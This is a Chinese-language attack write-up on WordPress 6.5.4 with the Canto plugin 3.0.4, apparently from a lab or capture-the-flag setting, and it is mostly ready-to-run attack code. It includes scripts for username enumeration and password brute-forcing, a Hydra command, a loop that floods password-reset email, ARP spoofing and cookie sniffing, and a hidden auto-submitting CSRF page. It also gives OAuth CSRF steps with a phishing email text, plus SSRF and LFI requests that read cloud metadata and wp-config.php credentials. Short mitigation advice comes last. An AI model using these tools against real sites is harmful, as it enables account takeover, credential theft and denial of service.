# WordPress 认证系统攻击

## 1. 概述

### 1.1 漏洞描述

WordPress 6.5.4 应用及其 Canto DAM 插件 v3.0.4 存在多个严重的认证机制缺陷，包括无速率限制、会话 Cookie 配置错误、OAuth CSRF、用户枚举等漏洞。这些漏洞组合使用可导致凭证窃取、会话劫持和未授权访问。

### 1.2 受影响组件

| 组件 | 漏洞类型 | 严重等级 | 认证要求 |
|------|---------|---------|---------|
| `/wp-login.php` | 无速率限制 | High | 无 |
| `/wp-login.php?action=lostpassword` | 无速率限制 | High | 无 |
| `/wp-login.php` | 用户枚举（错误消息） | High | 无 |
| `/?author={id}` | 用户枚举（作者归档） | High | 无 |
| 所有会话 Cookie | 缺失 SameSite 属性 | High | 无 |
| 所有会话 Cookie | 缺失 Secure 标志 | High | 无 |
| Canto OAuth 回调 | OAuth CSRF | Critical | 管理员 |
| Canto OAuth 令牌存储 | 无令牌验证 | Critical | 管理员 |

### 1.3 前置条件

- WordPress 6.5.4 安装 Canto DAM 插件 v3.0.4
- HTTP-only 部署（无 HTTPS/TLS）
- 无 WAF 或速率限制保护
- 无 CAPTCHA 保护

---

## 2. 用户枚举攻击

### 2.1 登录错误消息枚举

**漏洞原理：**
WordPress 登录端点针对不同错误情况返回不同的错误消息：
- 用户名不存在："The username **{username}** is not registered on this site."
- 密码错误："The password you entered for the username **{username}** is incorrect."

**探测方法：**
```bash
# 测试不存在的用户名
curl -s -X POST "http://target/wp-login.php" \
  -d "log=nonexistent_user_12345&pwd=anypassword" \
  | grep -o "not registered"

# 测试存在的用户名
curl -s -X POST "http://target/wp-login.php" \
  -d "log=wordpress_admin&pwd=wrongpassword" \
  | grep -o "password you entered"
```

**自动化枚举脚本：**
```python
#!/usr/bin/env python3
import requests

target = "http://target/wp-login.php"
usernames = ["admin", "administrator", "wordpress_admin", "root", "test", "user"]

for username in usernames:
    response = requests.post(target, data={
        "log": username,
        "pwd": "wrongpassword123"
    })
    
    if "not registered" in response.text:
        print(f"[-] {username} - NOT EXISTS")
    elif "password you entered" in response.text:
        print(f"[+] {username} - EXISTS")
    else:
        print(f"[?] {username} - UNKNOWN")
```

### 2.2 密码重置枚举

**漏洞原理：**
密码重置端点也泄露用户存在性信息：
- 用户不存在："Error: There is no account with that username or email address."
- 用户存在："Check your email for the confirmation link."

**探测方法：**
```bash
# 测试不存在的用户
curl -s -X POST "http://target/wp-login.php?action=lostpassword" \
  -d "user_login=nonexistent_user" \
  | grep -o "no account with that"

# 测试存在的用户
curl -s -X POST "http://target/wp-login.php?action=lostpassword" \
  -d "user_login=wordpress_admin" \
  | grep -o "Check your email"
```

### 2.3 作者归档枚举（最高效）

**漏洞原理：**
WordPress 默认启用作者归档页面，通过 `?author={id}` 参数访问时会 302 重定向到 `/author/{username}/` URL，直接暴露用户名。

**探测方法：**
```bash
# 枚举单个作者 ID
curl -s -I "http://target/?author=1" | grep Location
# 预期输出：Location: http://target/index.php/author/wordpress_admin/

# 自动化枚举脚本
#!/bin/bash
target="http://target"

for id in $(seq 1 100); do
    redirect=$(curl -s -I "${target}/?author=${id}" | grep Location)
    if [[ -n "$redirect" ]]; then
        username=$(echo "$redirect" | grep -oP 'author/\K[^/]+')
        echo "[+] Author ID ${id}: ${username}"
    fi
done
```

**完整枚举工具：**
```python
#!/usr/bin/env python3
import requests
import sys

target = "http://target"
found_users = []

print(f"[*] Enumerating WordPress authors from {target}")
print("=" * 50)

for author_id in range(1, 101):
    try:
        response = requests.get(f"{target}/?author={author_id}", allow_redirects=False)
        if response.status_code == 301 or response.status_code == 302:
            location = response.headers.get('Location', '')
            if '/author/' in location:
                username = location.split('/author/')[-1].strip('/')
                if username:
                    found_users.append((author_id, username))
                    print(f"[+] Author ID {author_id}: {username}")
    except Exception as e:
        print(f"[-] Error checking ID {author_id}: {e}")

print("=" * 50)
print(f"[*] Found {len(found_users)} authors")
for aid, user in found_users:
    print(f"  - {user} (ID: {aid})")
```

---

## 3. 暴力破解攻击

### 3.1 登录接口暴力破解

**漏洞原理：**
WordPress 登录端点 (`/wp-login.php`) 无任何速率限制、账户锁定或 CAPTCHA 保护，可执行无限制暴力破解。

**测试方法：**
```bash
# 单密码测试（确认无速率限制）
for i in {1..50}; do
    curl -s -X POST "http://target/wp-login.php" \
      -d "log=wordpress_admin&pwd=test_password_${i}" \
      -o /dev/null -w "Request ${i}: %{http_code} (%{time_total}s)\n"
done

# 预期：所有 50 个请求都返回 200，无延迟增加
```

**自动化暴力破解脚本：**
```python
#!/usr/bin/env python3
import requests
import time
from threading import Thread

target = "http://target/wp-login.php"
username = "wordpress_admin"  # 通过枚举获得

passwords = [
    "admin", "password", "Password123", "wordpress",
    "wordpress_admin", "admin123", "123456", "password123",
    "letmein", "welcome", "qwerty", "flag", "ctf",
    "wordpress123", "melodic", "mayhem", "root", "test",
    "P@ssw0rd", "P@ssw0rd123", "Admin123", "WordPress123"
]

def test_password(pwd):
    response = requests.post(target, data={
        "log": username,
        "pwd": pwd,
        "wp-submit": "Log In"
    })
    
    # 成功登录会重定向到 /wp-admin/
    if response.status_code == 302 and '/wp-admin/' in response.headers.get('Location', ''):
        print(f"\n[+] SUCCESS! Password found: {pwd}")
        return True
    return False

print(f"[*] Starting brute force attack on {username}")
print(f"[*] Testing {len(passwords)} passwords...")
print("=" * 50)

start = time.time()
for i, pwd in enumerate(passwords, 1):
    if test_password(pwd):
        break
    print(f"[-] Attempt {i}/{len(passwords)}: {pwd} - FAILED")

duration = time.time() - start
print(f"\n[*] Completed {len(passwords)} attempts in {duration:.2f}s")
print(f"[*] Rate: {len(passwords)/duration:.2f} passwords/second")
```

**使用 Hydra 暴力破解：**
```bash
# 创建密码字典
echo -e "admin\npassword\nPassword123\nwordpress\nwordpress_admin" > passwords.txt

# 执行 Hydra 攻击
hydra -l wordpress_admin -P passwords.txt \
  -s 35995 -f -V \
  target http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:password you entered"
```

### 3.2 密码重置 DoS 攻击

**漏洞原理：**
密码重置端点无速率限制，可用于：
1. 邮件轰炸攻击（Email Bombing）
2. 资源耗尽攻击（每个请求生成令牌、写数据库、发送邮件）

**攻击方法：**
```bash
#!/bin/bash
target="http://target/wp-login.php?action=lostpassword"
victim="wordpress_admin"

echo "[*] Sending 100 password reset requests to ${victim}..."

for i in {1..100}; do
    curl -s -X POST "$target" -d "user_login=${victim}" -o /dev/null &
    if (( i % 10 == 0 )); then
        echo "[*] Sent ${i}/100 requests..."
    fi
done

wait
echo "[*] Attack complete"
```

---

## 4. 会话劫持攻击

### 4.1 HTTP 明文会话窃取

**漏洞原理：**
WordPress 部署在 HTTP-only 环境，会话 Cookie 无 Secure 标志，可通过网络嗅探窃取。

**网络嗅探方法：**
```bash
# 使用 tcpdump 捕获会话 Cookie
sudo tcpdump -i eth0 -A 'tcp port 35995 and (dst host victim_ip)' \
  | grep -E "Set-Cookie: wordpress" > captured_cookies.txt

# 使用 Wireshark 过滤
# 过滤器：http.cookie contains "wordpress"
```

**ARP 欺骗 + 会话窃取：**
```bash
# 启用 IP 转发
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP 欺骗（攻击者作为中间人）
arpspoof -i eth0 -t victim_ip gateway
arpspoof -i eth0 -t gateway victim_ip

# 使用 BetterCAP 自动捕获 Cookie
bettercap -iface eth0
# 在 bettercap 中执行：
# set arp.spoof.targets victim_ip
# arp.spoof on
# set http.proxy.captive_portal true
# http.proxy on
```

### 4.2 CSRF 会话劫持

**漏洞原理：**
WordPress 会话 Cookie 缺失 SameSite 属性，允许跨站请求携带 Cookie。

**攻击页面示例：**
```html
<!DOCTYPE html>
<html>
<head><title>Innocent Page</title></head>
<body>
    <h1>Welcome to My Website!</h1>
    
    <!-- 隐藏 CSRF 攻击表单 -->
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form id="csrf-form"
          action="http://target/wp-admin/admin-ajax.php"
          method="POST"
          target="csrf-frame">
        <input type="hidden" name="action" value="updateOptions">
        <input type="hidden" name="duplicates" value="1">
        <input type="hidden" name="cron" value="1">
        <input type="hidden" name="schedule" value="hourly">
    </form>

    <script>
        // 当登录管理员访问时自动提交
        window.onload = function() {
            document.getElementById('csrf-form').submit();
        };
    </script>
</body>
</html>
```

**利用步骤：**
1. 攻击者托管恶意页面在 `attacker.com`
2. 诱骗 WordPress 管理员访问（钓鱼邮件、XSS 等）
3. 管理员浏览器自动携带 WordPress Cookie 提交表单
4. 攻击者修改 WordPress 设置

---

## 5. OAuth CSRF 攻击

### 5.1 漏洞原理

Canto 插件 OAuth 2.0 实现存在严重缺陷：
1. State 参数生成但从未验证
2. OAuth 令牌直接来自 URL 参数，无验证
3. 重定向 URI 使用第三方中介，无来源验证

**脆弱代码位置：**
```php
// State 生成（第 276 行）
$state = urlencode($scheme . '://' . $http_host . $request_url);
// 问题：State 仅包含当前 URL，非随机值，且未存储

// OAuth 回调处理（第 482-513 行）
if (isset($_GET['token']) && isset($_GET['domain'])) {
    // 问题：无 State 验证！
    // if ($_GET['state'] === get_option('oauth_state')) 缺失
    update_option('fbc_app_token', $_GET['token']);  // 直接信任输入
    update_option('fbc_refresh_token', $_GET['refreshToken']);
}
```

### 5.2 攻击步骤

**步骤 1：攻击者发起自己的 OAuth 流程**
```bash
# 攻击者访问 Canto OAuth 授权端点
curl -L "https://oauth.canto.com/oauth/api/oauth2/authorize?client_id=ATTACKER_CLIENT&redirect_uri=https://oauth.canto.com/oauth/api/callback/wordress"

# 完成授权，获取回调参数
# 获得：token=ATTACKER_TOKEN&refreshToken=ATTACKER_REFRESH&domain=attacker.canto.com&app_api=canto.com
```

**步骤 2：构造恶意回调 URL**
```
http://target/wp-admin/options-general.php?page=canto_settings&
    token=ATTACKER_TOKEN&
    refreshToken=ATTACKER_REFRESH_TOKEN&
    domain=attacker.canto.com&
    app_api=canto.com
```

**步骤 3：诱骗管理员访问**
```bash
# 通过钓鱼邮件发送恶意链接
# 或通过 XSS 注入重定向

# 示例钓鱼邮件内容：
# Subject: 紧急：Canto 集成需要重新授权
# Body: 请点击以下链接重新授权 Canto 集成：
# http://target/wp-admin/options-general.php?page=canto_settings&token=...
```

**步骤 4：管理员访问后，WordPress 链接到攻击者 Canto 账户**
```bash
# 验证攻击成功
curl -b admin_cookies.txt "http://target/wp-admin/options-general.php?page=canto_settings" \
  | grep -o "attacker.canto.com"
```

### 5.3 攻击影响

- 受害者 WordPress 导入的媒体来自攻击者控制的 Canto 账户
- 攻击者可监控受害者媒体使用模式
- 可注入恶意媒体文件
- 持久化后门直到管理员手动断开

---

## 6. 组合攻击场景

### 6.1 用户枚举 + 暴力破解 + 会话劫持

**攻击流程：**

1. **枚举用户名**
```bash
# 使用作者归档枚举
./enumerate_authors.py http://target > users.txt
# 输出：wordpress_admin (ID: 1)
```

2. **暴力破解密码**
```bash
# 使用枚举的用户名进行暴力破解
./bruteforce.py http://target wordpress_admin passwords.txt
# 如果成功：获得凭证
```

3. **如果暴力破解失败，使用会话劫持**
```bash
# 在同一 WiFi 网络嗅探会话
sudo tcpdump -i wlan0 -A 'tcp port 35995' | grep "wordpress_logged_in"

# 或使用 CSRF 攻击
# 诱骗管理员访问恶意页面
```

### 6.2 OAuth CSRF + SSRF + LFI 组合攻击

**攻击流程：**

1. **OAuth CSRF 链接受害者到攻击者 Canto**
```bash
# 诱骗管理员访问恶意 OAuth 回调
curl "http://target/wp-admin/options-general.php?page=canto_settings&token=ATTACKER_TOKEN&..."
```

2. **通过 SSRF 探测内部网络**
```bash
# 使用 Canto 插件 SSRF 漏洞
curl -b admin_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?subdomain=169.254.169&app_api=254/latest/meta-data"
```

3. **通过 LFI 读取敏感文件**
```bash
# 读取 wp-config.php 获取数据库凭证
curl -b admin_cookies.txt "http://target/wp-content/plugins/canto/includes/lib/get.php?wp_abspath=/var/www/html/wp-config.php%00"
```

---

## 7. 自动化工具

### 7.1 WPScan

```bash
# 用户枚举
wpscan --url http://target --enumerate u

# 暴力破解
wpscan --url http://target --passwords passwords.txt --username wordpress_admin

# 完整扫描
wpscan --url http://target --enumerate ap,at,cb,dbe,u,m --plugins-detection aggressive
```

### 7.2 自定义综合攻击脚本

```python
#!/usr/bin/env python3
import requests
import sys

class WordPressAuthAttacker:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.users = []
        
    def enumerate_authors(self, max_id=100):
        """通过作者归档枚举用户名"""
        print(f"[*] Enumerating authors (ID 1-{max_id})...")
        for i in range(1, max_id + 1):
            try:
                resp = self.session.get(f"{self.target}/?author={i}", allow_redirects=False)
                if resp.status_code in [301, 302]:
                    loc = resp.headers.get('Location', '')
                    if '/author/' in loc:
                        user = loc.split('/author/')[-1].strip('/')
                        self.users.append(user)
                        print(f"[+] Found user: {user} (ID: {i})")
            except:
                pass
        return self.users
    
    def bruteforce(self, username, password_file):
        """暴力破解指定用户"""
        print(f"[*] Bruteforcing {username}...")
        with open(password_file, 'r') as f:
            passwords = [l.strip() for l in f.readlines()]
        
        for pwd in passwords:
            try:
                resp = self.session.post(f"{self.target}/wp-login.php", data={
                    "log": username,
                    "pwd": pwd,
                    "wp-submit": "Log In"
                })
                if resp.status_code == 302 and '/wp-admin/' in resp.headers.get('Location', ''):
                    print(f"[+] SUCCESS! Password: {pwd}")
                    return pwd
            except:
                pass
        print(f"[-] Failed to crack {username}")
        return None
    
    def check_rate_limiting(self):
        """检查速率限制"""
        print("[*] Checking rate limiting...")
        start = __import__('time').time()
        for i in range(50):
            self.session.post(f"{self.target}/wp-login.php", data={
                "log": "test",
                "pwd": "test"
            })
        duration = __import__('time').time() - start
        print(f"[*] 50 requests in {duration:.2f}s ({50/duration:.2f} req/s)")
        if duration < 10:
            print("[!] WARNING: No rate limiting detected!")
        return duration < 10

# 使用示例
if __name__ == "__main__":
    attacker = WordPressAuthAttacker("http://target")
    attacker.enumerate_authors()
    if attacker.users:
        attacker.bruteforce(attacker.users[0], "passwords.txt")
    attacker.check_rate_limiting()
```

---

## 8. 缓解措施

### 8.1 立即修复

**安装速率限制插件：**
```bash
# 推荐插件：
# - Limit Login Attempts Reloaded
# - Wordfence Security
# - iThemes Security
```

**启用 HTTPS：**
```apache
# Apache 配置 HTTPS 重定向
<VirtualHost *:80>
    ServerName target
    Redirect permanent / https://target/
</VirtualHost>

<VirtualHost *:443>
    SSLEngine on
    SSLCertificateFile /path/to/cert.pem
    SSLCertificateKeyFile /path/to/key.pem
</VirtualHost>
```

**修复 OAuth CSRF：**
```php
// 修复 State 验证
$state = bin2hex(random_bytes(32));
update_option('fbc_oauth_state', $state);

// 回调时验证
if ($_GET['state'] !== get_option('fbc_oauth_state')) {
    wp_die('Invalid OAuth state');
}
delete_option('fbc_oauth_state');
```

### 8.2 长期加固

**禁用作者归档：**
```php
// functions.php 添加
add_action('template_redirect', function() {
    if (is_author()) {
        wp_redirect(home_url());
        exit;
    }
});
```

**统一错误消息：**
```php
// 使用相同错误消息防止枚举
add_filter('login_errors', function() {
    return 'Invalid username or password.';
});
```

---

## 9. 参考资源

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [WordPress 安全加固指南](https://wordpress.org/support/article/hardening-wordpress/)
- [OAuth 2.0 安全最佳实践](https://oauth.net/2/)